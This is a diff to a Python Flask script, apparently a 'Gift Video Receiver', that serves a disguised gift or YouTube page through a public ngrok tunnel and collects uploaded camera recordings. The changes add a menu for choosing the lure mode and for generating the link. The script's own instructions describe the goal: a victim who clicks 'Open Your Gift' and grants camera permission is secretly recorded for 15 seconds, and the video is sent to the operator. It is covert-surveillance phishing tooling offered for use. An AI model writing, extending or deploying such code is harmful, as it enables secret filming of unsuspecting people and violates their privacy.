@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Gift Video Receiver Server - With YouTube Video Support
+Gift Video Receiver Server - Dual Mode with Terminal Menu
 """
 
 import os
@@ -20,7 +20,8 @@ from flask_cors import CORS
 # ============================================
 UPLOAD_FOLDER = 'gift_videos'
 PORT = 5000
-HTML_FILE = 'youtube-gift.html'  # Changed to new HTML file
+FESTIVAL_HTML = 'festival.html'
+YOUTUBE_HTML = 'youtube.html'
 
 # ============================================
 # Flask Application
@@ -30,15 +31,23 @@ CORS(app)
 
 received_videos = []
 
-@app.route('/')
-def index():
+@app.route('/festival')
+def festival_page():
     """Serve the festival HTML page"""
     try:
-        with open(HTML_FILE, 'r') as f:
-            html_content = f.read()
-        return html_content
+        with open(FESTIVAL_HTML, 'r') as f:
+            return f.read()
     except FileNotFoundError:
-        return f"<h1>Error: {HTML_FILE} not found!</h1><p>Make sure the HTML file is in the same directory.</p>", 404
+        return f"<h1>Error: {FESTIVAL_HTML} not found!</h1>", 404
+
+@app.route('/youtube')
+def youtube_page():
+    """Serve the YouTube HTML page"""
+    try:
+        with open(YOUTUBE_HTML, 'r') as f:
+            return f.read()
+    except FileNotFoundError:
+        return f"<h1>Error: {YOUTUBE_HTML} not found!</h1>", 404
 
 @app.route('/upload', methods=['POST'])
 def upload_video():
@@ -86,12 +95,10 @@ def upload_video():
 
 @app.route('/videos', methods=['GET'])
 def list_videos():
-    """Return list of received videos"""
     return jsonify({'videos': received_videos})
 
 @app.route('/download/<filename>', methods=['GET'])
 def download_video(filename):
-    """Download a specific video"""
     filepath = os.path.join(UPLOAD_FOLDER, filename)
     if os.path.exists(filepath):
         return send_file(filepath, as_attachment=True)
@@ -109,19 +116,69 @@ class GiftServer:
         self.ngrok_ready = threading.Event()
 
     def setup_directories(self):
-        """Create necessary directories"""
         Path(UPLOAD_FOLDER).mkdir(exist_ok=True)
 
-    def check_html_file(self):
-        """Check if HTML file exists"""
-        if not os.path.exists(HTML_FILE):
-            print(f"\n❌ Error: {HTML_FILE} not found!")
-            print(f"📁 Make sure {HTML_FILE} is in the current directory")
+    def check_html_files(self):
+        """Check if HTML files exist"""
+        if not os.path.exists(FESTIVAL_HTML):
+            print(f"\n❌ Error: {FESTIVAL_HTML} not found!")
+            return False
+        if not os.path.exists(YOUTUBE_HTML):
+            print(f"\n❌ Error: {YOUTUBE_HTML} not found!")
             return False
         return True
 
+    def show_menu(self):
+        """Show terminal menu and get user choice"""
+        print("\n" + "="*60)
+        print("🎁 GIFT VIDEO RECEIVER")
+        print("="*60)
+        print("\nSelect mode:")
+        print("  1. 🎊 Festival Mode - Gift/surprise page")
+        print("  2. 🎬 YouTube Mode - YouTube video with gift")
+        print("\n" + "-"*60)
+        
+        while True:
+            choice = input("\nEnter choice (1 or 2): ").strip()
+            if choice == '1':
+                return 'festival'
+            elif choice == '2':
+                return 'youtube'
+            else:
+                print("❌ Invalid choice. Enter 1 or 2")
+
+    def get_festival_name(self):
+        """Get festival/gift name from user"""
+        name = input("\n📝 Enter festival/gift name: ").strip()
+        if not name:
+            name = "Surprise"
+            print(f"   Using default: {name}")
+        return name
+
+    def get_youtube_video(self):
+        """Get YouTube video ID from user"""
+        print("\n🎬 Enter YouTube video URL or ID:")
+        print("   (Press Enter for default video)")
+        video = input("   ▶ ").strip()
+        if not video:
+            video = "dQw4w9WgXcQ"  # Rick Astley - Never Gonna Give You Up
+            print(f"   Using default video ID: {video}")
+        return video
+
+    def generate_link(self, mode, name, video_id=None):
+        """Generate the appropriate link based on mode"""
+        base_url = self.ngrok_url
+        
+        if mode == 'festival':
+            link = f"{base_url}/festival?name={urllib.parse.quote(name)}"
+            mode_name = "🎊 Festival Mode"
+        else:
+            link = f"{base_url}/youtube?video={urllib.parse.quote(video_id)}&name={urllib.parse.quote(name)}"
+            mode_name = "🎬 YouTube Mode"
+        
+        return link, mode_name
+
     def check_ngrok(self):
-        """Check if ngrok is installed"""
         try:
             result = subprocess.run(['ngrok', '--version'], capture_output=True, text=True)
             if result.returncode == 0:
@@ -131,11 +188,9 @@ class GiftServer:
         
         print("\n❌ ngrok is not installed or not in PATH!")
         print("📥 Install from: https://ngrok.com/download")
-        print("🔑 Then authenticate: ngrok config add-authtoken YOUR_TOKEN")
         return False
 
     def monitor_ngrok(self):
-        """Monitor ngrok and get the public URL"""
         try:
             time.sleep(3)
             for attempt in range(10):
@@ -153,7 +208,6 @@ class GiftServer:
             print(f"❌ Error monitoring ngrok: {e}")
 
     def start_ngrok(self):
-        """Start ngrok tunnel"""
         print(f"\n🚀 Starting ngrok tunnel on port {self.port}...")
         
         try:
@@ -173,7 +227,6 @@ class GiftServer:
                 return True
             else:
                 print("⚠️ ngrok started but URL not found")
-                print("📋 Check http://localhost:4040 for the URL")
                 return False
                 
         except Exception as e:
@@ -181,7 +234,6 @@ class GiftServer:
             return False
 
     def start_flask(self):
-        """Start the Flask server"""
         print(f"\n🔧 Starting server on port {self.port}...")
         
         def run_flask():
@@ -193,29 +245,9 @@ class GiftServer:
         time.sleep(2)
         print("✅ Server running")
 
-    def generate_link(self):
-        """Generate and display the shareable link"""
-        print("\n" + "="*50)
-        print("📤 SHARE THIS GIFT LINK:")
-        print("="*50)
-        print(f"\n🔗 {self.ngrok_url}")
-        print("\n" + "="*50)
-        print("\n📋 Instructions:")
-        print("   1. Send the link above to anyone")
-        print("   2. They see a YouTube video of YOUR choice")
-        print("   3. They click 'Open Your Gift'")
-        print("   4. They grant camera permission")
-        print("   5. 15-second video auto-records (hidden)")
-        print("   6. Video saves to your computer!")
-        print("\n📌 The user can change the YouTube video")
-        print("   by pasting any YouTube URL!")
-        print("="*50)
-        print("\n📋 Link printed above - copy it manually")
-        print(f"📁 Videos will be saved in: {UPLOAD_FOLDER}/")
-
     def wait_for_videos(self):
-        """Monitor for incoming videos"""
         print("\n🎁 Waiting for gifts... (Press Ctrl+C to stop)")
+        print(f"📁 Videos saved in: {UPLOAD_FOLDER}/")
         print("-"*50)
         print("\n⏳ Waiting for first video...")
         
@@ -235,7 +267,6 @@ class GiftServer:
             print("\n\n👋 Shutting down...")
 
     def cleanup(self):
-        """Clean up processes"""
         print("\n🧹 Cleaning up...")
         if self.ngrok_process:
             self.ngrok_process.terminate()
@@ -246,21 +277,65 @@ class GiftServer:
         print("✅ Done!")
 
     def run(self):
-        """Main execution flow"""
         try:
             self.setup_directories()
             
-            if not self.check_html_file():
+            if not self.check_html_files():
                 return
             
             if not self.check_ngrok():
                 return
             
+            # Show menu and get choice
+            mode = self.show_menu()
+            
+            # Get details based on mode
+            name = self.get_festival_name()
+            
+            if mode == 'festival':
+                video_id = None
+                mode_display = "🎊 Festival Mode"
+            else:
+                video_id = self.get_youtube_video()
+                mode_display = "🎬 YouTube Mode"
+            
+            # Start server
             self.start_flask()
             if not self.start_ngrok():
                 return
             
-            self.generate_link()
+            # Generate link
+            link, mode_name = self.generate_link(mode, name, video_id)
+            
+            # Display the link
+            print("\n" + "="*60)
+            print(f"📤 SHARE THIS LINK ({mode_name}):")
+            print("="*60)
+            print(f"\n🔗 {link}")
+            print("\n" + "="*60)
+            
+            if mode == 'festival':
+                print("\n📋 Instructions:")
+                print("   1. Send the link above to anyone")
+                print("   2. They see a festival/gift page")
+                print("   3. They click 'Open Your Gift'")
+                print("   4. They grant camera permission")
+                print("   5. 15-second video auto-records (hidden)")
+                print("   6. Video saves to your computer!")
+            else:
+                print("\n📋 Instructions:")
+                print("   1. Send the link above to anyone")
+                print("   2. They see a YouTube video playing")
+                print("   3. They click 'Open Your Gift'")
+                print("   4. They grant camera permission")
+                print("   5. 15-second video auto-records (hidden)")
+                print("   6. Video saves to your computer!")
+                print(f"\n📌 YouTube Video ID: {video_id}")
+            
+            print("="*60)
+            print("\n📋 Link printed above - copy it manually")
+            print(f"📁 Videos saved in: {UPLOAD_FOLDER}/")
+            
             self.wait_for_videos()
             
         except KeyboardInterrupt:
@@ -268,9 +343,6 @@ class GiftServer:
         finally:
             self.cleanup()
 
-# ============================================
-# Entry Point
-# ============================================
 if __name__ == '__main__':
     server = GiftServer()
     server.run()
